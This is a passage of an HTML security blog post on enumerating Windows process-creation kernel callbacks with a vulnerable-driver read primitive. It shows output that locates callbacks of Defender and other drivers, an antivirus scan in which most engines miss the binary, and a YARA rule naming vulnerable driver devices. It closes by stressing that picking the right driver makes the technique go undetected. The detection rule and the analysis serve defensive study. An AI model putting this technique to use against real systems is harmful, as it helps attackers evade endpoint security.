+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3b3fe76f</span>
+<span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3b3fe766</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff800117d63d0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">WdFilter</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3b4fe9df</span>
+<span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3b4fe9d6</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff80010086e20</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">ksecdd</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3b4fe13f</span>
+<span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3b4fe136</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff800102746a0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">dxgkrnl</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3b4ff6cf</span>
+<span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3b4ff6c6</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff80011fae140</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">tcpip</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[5]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f722f</span>
+<span class="hljs-selector-attr">[5]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f7226</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[5]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff800125d0710</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">iorate</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[6]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f89cf</span>
+<span class="hljs-selector-attr">[6]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f89c6</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[6]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff800108088c0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">CI</span><span class="hljs-selector-class">.dll</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[7]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f7e8f</span>
+<span class="hljs-selector-attr">[7]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f3c1f7e86</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[7]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff80013a861b0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">UCPD</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[8]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f439cb5df</span>
+<span class="hljs-selector-attr">[8]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f439cb5d6</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[8]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff80015f110d0</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">peauth</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[9]</span> <span class="hljs-selector-tag">raw</span>: 0<span class="hljs-selector-tag">xffffc28f42dc919f</span>
+<span class="hljs-selector-attr">[9]</span> <span class="hljs-selector-tag">decoded</span>: 0<span class="hljs-selector-tag">xffffc28f42dc9196</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-attr">[9]</span> <span class="hljs-selector-tag">cbFunction</span>: 0<span class="hljs-selector-tag">xfffff80015d99f70</span>
+    <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">KslD</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+<span class="hljs-selector-tag">Read</span> <span class="hljs-selector-tag">primitive</span> <span class="hljs-selector-tag">sent</span> <span class="hljs-selector-tag">successfully</span>. <span class="hljs-selector-tag">Bytes</span> <span class="hljs-selector-tag">returned</span>: 0
+...</code></pre>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs css"><span class="hljs-selector-attr">[0]</span> <span class="hljs-selector-tag">cng</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[1]</span> <span class="hljs-selector-tag">WdFilter</span><span class="hljs-selector-class">.sys</span>      ← <span class="hljs-selector-tag">Windows</span> <span class="hljs-selector-tag">Defender</span>
+<span class="hljs-selector-attr">[2]</span> <span class="hljs-selector-tag">ksecdd</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[3]</span> <span class="hljs-selector-tag">dxgkrnl</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[4]</span> <span class="hljs-selector-tag">tcpip</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[5]</span> <span class="hljs-selector-tag">iorate</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[6]</span> <span class="hljs-selector-tag">CI</span><span class="hljs-selector-class">.dll</span>
+<span class="hljs-selector-attr">[7]</span> <span class="hljs-selector-tag">UCPD</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[8]</span> <span class="hljs-selector-tag">peauth</span><span class="hljs-selector-class">.sys</span>
+<span class="hljs-selector-attr">[9]</span> <span class="hljs-selector-tag">KslD</span><span class="hljs-selector-class">.sys</span></code></pre>
+
+
+
+<h2 class="wp-block-heading" id="e027">Detection</h2>
+
+
+
+<p id="4436">Now it’s time to see if the defenses are detecting this as a malicious threat.</p>
+
+
+
+<p id="7266">Basically the summary is, if you use another vulnerable driver will work OK, with this driver you will be always caught.</p>
+
+
+
+<h3 class="wp-block-heading" id="9800">Kleenscan API</h3>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs ruby">[*] Antivirus Scan <span class="hljs-symbol">Results:</span>
+
+  - alyac                <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - amiti                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - arcabit              <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - avast                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - avg                  <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - avira                |</span> <span class="hljs-symbol">Status:</span> scanning   <span class="hljs-params">| Flag: Scanning results incomplete    |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - bullguard            <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - clamav               |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - comodolinux          <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - crowdstrike          |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - drweb                <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - emsisoft             |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - escan                <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - fprot                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - fsecure              <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - gdata                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - ikarus               <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - immunet              |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - kaspersky            <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - maxsecure            |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - mcafee               <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - microsoftdefender    |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - nano                 <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - nod32                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - norman               <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - secureageapex        |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Unknown                        |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - seqrite              <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - sophos               |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - threatdown           <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - trendmicro           |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - vba32                <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - virusfighter         |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected                     |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - xvirus               <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - zillya               |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Scanning results incomplete    |</span> <span class="hljs-symbol">Updated:</span> <span class="hljs-number">2026</span>-<span class="hljs-number">04</span>-<span class="hljs-number">20</span>
+  - zonealarm            <span class="hljs-params">| Status: ok         |</span> <span class="hljs-symbol">Flag:</span> Undetected                     <span class="hljs-params">| Updated: 2026-04-20
+  - zoner                |</span> <span class="hljs-symbol">Status:</span> ok         <span class="hljs-params">| Flag: Undetected        </span></code></pre>
+
+
+
+<h3 class="wp-block-heading" id="ff1a">Litterbox</h3>
+
+
+
+<p id="b556">Static Analysis:</p>
+
+
+
+<figure class="wp-block-image size-full"><img decoding="async" width="974" height="617" src="https://core-jmp.org/wp-content/uploads/2026/04/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA-%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0-2026-04-24-%D0%B2-15.29.02.png" alt="" class="wp-image-2539"></figure>
+
+
+
+<h3 class="wp-block-heading" id="f14a">Windows Defender</h3>
+
+
+
+<p id="5b0e">Driver detected, but technique undetected.</p>
+
+
+
+<h3 class="wp-block-heading" id="4e2e">YARA</h3>
+
+
+
+<p id="82fe">Here a YARA rule to detect this technique:</p>
+
+
+
+<pre class="wp-block-code has-small-font-size"><code class="hljs php">rule Detect_PspCreateProcessNotifyRoutine_Enumeration
+{
+    meta:
+        author      = <span class="hljs-string">"0x12 Dark Development"</span>
+        description = <span class="hljs-string">"Detects binaries that attempt to enumerate PspCreateProcessNotifyRoutine kernel callbacks via BYOVD read primitives"</span>
+        date        = <span class="hljs-string">"2026-04-21"</span>
+        tags        = <span class="hljs-string">"kernel, byovd, edr-evasion, callback-enumeration"</span>
+
+    strings:
+        <span class="hljs-comment">// NtQuerySystemInformation with SystemModuleInformation (class 11)</span>
+        $ntqsi = <span class="hljs-string">"NtQuerySystemInformation"</span> ascii wide
+
+        <span class="hljs-comment">// Vulnerable driver device names commonly used for read primitives</span>
+        $dev_gio     = <span class="hljs-string">"\\\\.\\GIO"</span> ascii wide
+        $dev_rtcore  = <span class="hljs-string">"\\\\.\\RTCore64"</span> ascii wide
+        $dev_physmem = <span class="hljs-string">"\\\\.\\PhysicalMemory"</span> ascii wide
+        $dev_gdrv    = <span class="hljs-string">"\\\\.\\GDrv"</span> ascii wide
+
+        <span class="hljs-comment">// Kernel symbol strings sometimes referenced at runtime</span>
+        $sym1 = <span class="hljs-string">"PspCreateProcessNotifyRoutine"</span> ascii wide
+        $sym2 = <span class="hljs-string">"ntoskrnl.exe"</span> ascii wide nocase
+
+        <span class="hljs-comment">// DeviceIoControl pattern used to send IOCTL read primitives</span>
+        $ioctl = <span class="hljs-string">"DeviceIoControl"</span> ascii wide
+
+        <span class="hljs-comment">// Pointer decode pattern: callback &amp; ~((1ULL &lt;&lt; 3) + 0x1) = &amp; ~0x9</span>
+        <span class="hljs-comment">// Compiled usually to: and rax, FFFFFFFFFFFFFFF6</span>
+        $decode_ptr = { <span class="hljs-number">48</span> <span class="hljs-number">83</span> E? F6 }
+
+        <span class="hljs-comment">// 0xffff000000000000 mask used to fix truncated kernel addresses</span>
+        $ffff_mask = { <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> FF FF }
+
+        <span class="hljs-comment">// Loop over 64 entries (0x40 = 64 in hex, common in compiled loops)</span>
+        $loop_64 = { <span class="hljs-number">83</span> F? <span class="hljs-number">40</span> }
+
+    condition:
+        uint16(<span class="hljs-number">0</span>) == <span class="hljs-number">0x5A4D</span> <span class="hljs-keyword">and</span>         <span class="hljs-comment">// PE file</span>
+        $ntqsi <span class="hljs-keyword">and</span>
+        $ioctl <span class="hljs-keyword">and</span>
+        (<span class="hljs-number">1</span> of ($dev_*)) <span class="hljs-keyword">and</span>
+        $sym2 <span class="hljs-keyword">and</span>
+        <span class="hljs-number">2</span> of ($decode_ptr, $ffff_mask, $loop_64, $sym1)
+}</code></pre>
+
+
+
+<h2 class="wp-block-heading" id="dc35">Conclusions</h2>
+
+
+
+<p id="64d3">That’s it for this one. We’ve seen how Windows internally tracks process creation callbacks, and how easy it is to enumerate them from user-mode with nothing more than a read primitive and some pointer arithmetic.</p>
+
+
+
+<p id="bb39">The key takeaway here is that the technique itself is completely undetected, what gets flagged is the vulnerable driver, not your code. This is why driver selection matters so much in BYOVD scenarios.</p>
+
+
+
+<p></p>
+<div class="sharedaddy sd-sharing-enabled"><div class="robots-nocontent sd-block sd-social sd-social-icon-text sd-sharing"><h3 class="sd-title">Share this:</h3><div class="sd-content"><ul data-sharing-events-added="true"><li class="share-facebook"><a rel="nofollow noopener noreferrer" data-shared="sharing-facebook-2537" class="share-facebook sd-button share-icon" href="https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/?share=facebook&amp;nb=1" target="_blank" aria-labelledby="sharing-facebook-2537">
+				<span id="sharing-facebook-2537">Share on Facebook (Opens in new window)</span>
+				<span>Facebook</span>
+			</a></li><li class="share-x"><a rel="nofollow noopener noreferrer" data-shared="sharing-x-2537" class="share-x sd-button share-icon" href="https://core-jmp.org/2026/04/enumerating-windows-process-creation-callbacks/?share=x&amp;nb=1" target="_blank" aria-labelledby="sharing-x-2537">
+				<span id="sharing-x-2537">Share on X (Opens in new window)</span>
+				<span>X</span>
+			</a></li><li class="share-end"></li></ul></div></div></div><div class="sharedaddy sd-block sd-like jetpack-likes-widget-wrapper jetpack-likes-widget-unloaded" id="like-post-wrapper-252212136-2537-69edeb8c58f5e" data-src="https://widgets.wp.com/likes/?ver=15.7.1#blog_id=252212136&amp;post_id=2537&amp;origin=core-jmp.org&amp;obj_id=252212136-2537-69edeb8c58f5e" data-name="like-post-frame-252212136-2537-69edeb8c58f5e" data-title="Like or Reblog"><h3 class="sd-title">Like this:</h3><div class="likes-widget-placeholder post-likes-widget-placeholder" style="height: 55px;"><span class="button"><span>Like</span></span> <span class="loading">Loading...</span></div><span class="sd-text-color"></span><a class="sd-link-color"></a></div><div class="clear"></div>                                                </div>
+
+                                                                                                
+                                                                                            </div>
+
+
+                                            
+    
+
+
+                                            
+                                       </article>
+
+
+<!-- You can start editing here. -->
+
+
+        <!-- If comments are closed. -->
+    <p class="nocomments">Comments are closed.</p>
+
+    
+
+
+
+                    </div><!-- end content -->
+                </div><!-- end primary -->
+
+
+                
+            <!-- end primary siderbar -->
+
+
+            </div><!-- end container -->
+        </div><!-- end wrapper -->
+    </main><!-- end main -->
+
+    <!-- end sitefooter -->
+
+</div><!--! end of #inner-body -->
+
+    <div class="aux-hidden-blocks">
+
+        <section id="offmenu" class="aux-offcanvas-menu aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+            </div>
+            <div class="offcanvas-content">
+            </div>
+            <div class="offcanvas-footer">
+            </div>
+        </section>
+        <!-- offcanvas section -->
+
+        <section id="offcart" class="aux-offcanvas-menu aux-offcanvas-cart aux-pin-left">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="offcanvas-header">
+                Shopping Basket            </div>
+            <div class="aux-cart-wrapper aux-elegant-cart aux-offcart-content">
+            </div>
+        </section>
+        <!-- cartcanvas section -->
+
+                <section id="fs-menu-search" class="aux-fs-popup  aux-fs-menu-layout-center aux-indicator">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-fs-menu">
+                        </div>
+            <div class="aux-fs-search">
+                <div class="aux-search-section ">
+                <div class="aux-search-form ">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Type here.." name="s" autocomplete="off">
+                                    </div>
+                            <input type="submit" class="aux-black aux-search-submit aux-uppercase" value="Search">
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search and menu -->
+                <section id="fs-search" class="aux-fs-popup aux-search-overlay  has-ajax-form">
+            <div class="aux-panel-close">
+                <div class="aux-close aux-cross-symbol aux-thick-medium"></div>
+            </div>
+            <div class="aux-search-field">
+
+            <div class="aux-search-section aux-404-search">
+                <div class="aux-search-form aux-iconic-search">
+            <form action="https://core-jmp.org/" method="get">
+            <div class="aux-search-input-form">
+                            <input type="text" class="aux-search-field" placeholder="Search..." name="s" autocomplete="off">
+                                    </div>
+                            <div class="aux-submit-icon-container auxicon-search-4 ">
+                                        <input type="submit" class="aux-iconic-search-submit" value="Search">
+                </div>
+                        </form>
+        </div><!-- end searchform -->
+                </div>
+
+            </div>
+        </section>
+        <!-- fullscreen search-->
+
+        <div class="aux-scroll-top"></div>
+    </div>
+
+    <div class="aux-goto-top-btn aux-align-btn-right" style="display: block; transform: translateY(150px);"><div class="aux-hover-slide aux-arrow-nav aux-round aux-outline">    <span class="aux-overlay"></span>    <span class="aux-svg-arrow aux-h-small-up"></span>    <span class="aux-hover-arrow aux-svg-arrow aux-h-small-up aux-white"></span></div></div>
+<!-- outputs by wp_footer -->
+
+
+	
+				
+
+
+
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true"><div class="pswp__bg"></div><div class="pswp__scroll-wrap"><div class="pswp__container"><div class="pswp__item"></div><div class="pswp__item"></div><div class="pswp__item"></div></div><div class="pswp__ui pswp__ui--hidden"><div class="pswp__top-bar"><div class="pswp__counter"></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button><button class="pswp__button pswp__button--share" title="Share"></button><button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button><button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class="pswp__preloader"><div class="pswp__preloader__icn"><div class="pswp__preloader__cut"><div class="pswp__preloader__donut"></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class="pswp__share-tooltip"></div> </div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)"></button><button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class="pswp__caption"><div class="pswp__caption__center"></div></div></div></div></div>
+
+
+
+
+
+
+
+
+
+
+
+
+	<div src="https://widgets.wp.com/likes/master.html?ver=20260426#ver=20260426" scrolling="no" id="likes-master" name="likes-master" style="display:none;" data-original-tag="iframe">
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div src="https://public-api.wordpress.com/wp-admin/rest-proxy/#https://widgets.wp.com" style="display: none;" data-original-tag="iframe">
+
+
+
+
+
+
+</div></div>
+	<div id="likes-other-gravatars" role="dialog" aria-hidden="true" tabindex="-1"><div class="likes-text"><span>%d</span></div><ul class="wpl-avatars sd-like-gravatars"></ul></div>
+	<!-- end wp_footer -->
+
+
+</body></html>
